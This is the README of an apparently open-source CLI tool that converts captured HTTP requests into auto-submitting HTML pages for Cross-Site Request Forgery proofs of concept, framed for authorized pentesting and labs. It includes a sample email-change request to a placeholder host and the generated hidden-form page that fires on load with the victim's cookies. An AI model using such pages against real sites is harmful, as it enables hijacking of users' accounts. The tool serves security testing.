# CSRF PoC Forge

A small CLI tool that converts a raw HTTP request into a self-contained HTML Cross-Site Request Forgery (CSRF) Proof-of-Concept page. Drop in a captured request (e.g. from Burp Suite), get back an HTML file that, when opened in a victim's browser, auto-submits the same request against the target.

> **For authorized security testing only.** Use against targets you own or have explicit written permission to test (CTFs, bug bounty programs in scope, internal pentests, lab environments like PortSwigger Web Security Academy).

## What it does

Given a raw HTTP request like:

```
POST /my-account/change-email HTTP/1.1
Host: vulnerable.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=REPLACE_ME

email=attacker%40evil.com
```

It produces an HTML file that:

1. Builds a `<form>` targeting the same URL with the same method.
2. Translates every body parameter into a hidden `<input>`.
3. Auto-submits the form on page load via a `<script>` tag, so simply opening the file in a browser fires the request — using the victim's own cookies (no need to copy the `Cookie` header; the browser attaches it).

## Install

Clone and install in editable mode:

```sh
git clone https://github.com/CosminB24/CSRF-PoC-Forge.git
cd CSRF-PoC-Forge
pip install -e .
```

This registers a `csrf-forge` console command.

> **Windows PATH note:** if `pip` warns that the Scripts directory is not on PATH, you can either add `%APPDATA%\Python\Python3XX\Scripts` to your user PATH, or just invoke the tool via the module form below — it always works.

## Usage

```sh
csrf-forge -i request.txt poc.html
```

Or, with no PATH setup required:

```sh
python -m csrf_forge.cli -i request.txt poc.html
```

Open `poc.html` in a browser logged in to the target site and the request fires automatically.

### Options

| Flag | Description |
|------|-------------|
| `-i, --input <file>` | Raw HTTP request file (required) |
| `output` | Output HTML file (positional, optional — defaults to `poc.html`) |
| `-o, --output-file <file>` | Output HTML file (alternative to positional) |
| `--scheme {http,https}` | URL scheme for the target (default: `https`) |
| `-q, --quiet` | Suppress non-error output |
| `-V, --version` | Show version |
| `-h, --help` | Show help |

### Example

`request.txt`:

```
POST /my-account/change-email HTTP/1.1
Host: vulnerable.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=REPLACE_ME

email=attacker%40evil.com
```

Run:

```sh
csrf-forge -i request.txt poc.html
```

Generated `poc.html`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC</title>
</head>
<body>
    <form action="https://vulnerable.example.com/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="submit" value="Submit">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

## How it parses

- The first line is split into `METHOD PATH HTTP/VERSION`.
- Header lines (up to the first blank line) are parsed as `Name: value`.
- The body (everything after the blank line) is parsed as `application/x-www-form-urlencoded` key/value pairs.
- The target URL is built as `{scheme}://{Host}{path}` — `Host` is required.

### Current limitations

- Only URL-encoded bodies (`application/x-www-form-urlencoded`) are turned into form inputs. JSON / multipart bodies aren't supported yet.
- Only HTTP/HTTPS targets (no WebSocket).
- The `Cookie` header in your request file is **not** copied into the PoC — the victim's browser supplies their own cookies. This is the whole point of CSRF.

## Project layout

```
CSRF-PoC-Forge/
├── csrf_forge/
│   ├── __init__.py
│   └── cli.py
├── request.txt        # sample input
├── pyproject.toml
├── README.md
└── LICENSE
```

## License

MIT — see [LICENSE](LICENSE).
